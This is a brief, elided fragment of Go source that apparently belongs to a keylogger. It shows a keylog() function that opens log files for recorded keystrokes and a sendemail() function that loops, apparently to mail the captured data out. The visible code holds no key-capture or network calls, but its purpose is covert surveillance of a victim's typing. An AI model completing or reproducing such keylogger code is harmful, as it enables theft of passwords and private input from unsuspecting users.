...
func sendemail() {
	fmt.Println("Function sendemail() started")
	for {
...
func keylog() {
	...
	fmt.Println("FUNCTION keylog() STARTED")

	var keycode string
	var charKey string

	var file, errd = os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if errd != nil {
		fmt.Println(errd)
	}

	var simplefile, errs = os.OpenFile("simple.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if errs != nil {
		fmt.Println(errs)
	}
